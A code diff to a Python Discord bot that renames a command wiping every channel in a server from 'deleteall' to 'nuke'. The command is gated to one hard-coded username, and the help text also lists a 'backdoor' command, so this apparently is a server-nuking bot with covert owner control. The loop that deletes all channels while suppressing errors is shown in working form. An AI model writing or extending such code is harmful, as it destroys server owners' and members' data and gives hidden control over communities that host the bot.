@@ -42,15 +42,15 @@ async def sudo(ctx):
         "Commands:\n"
         "`$sudo startmessage`\n"
         "`$sudo stopmessage`\n"
-        "`$sudo deleteall NOW`\n"
+        "`$sudo nuke NOW`\n"
         "`$sudo add`\n"
         "`$sudo backdoor`\n"
         "`$sudo server rename <name>`"
     )
 
 # ================= DELETE ALL =================
-@sudo.command(name="deleteall")
-async def sudo_deleteall(ctx, key: str = None):
+@sudo.command(name="nuke")
+async def sudo_nuke(ctx, key: str = None):
     if ctx.author.name != "nico044037":
         return
     if key != "NOW":
@@ -58,7 +58,7 @@ async def sudo_deleteall(ctx, key: str = None):
 
     for channel in list(ctx.guild.channels):
         try:
-            await channel.delete(reason="sudo deleteall")
+            await channel.delete(reason="sudo nuke")
         except (discord.Forbidden, discord.HTTPException):
             pass
 
@@ -144,3 +144,4 @@ if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN environment variable not set")
 
 bot.run(TOKEN)
+
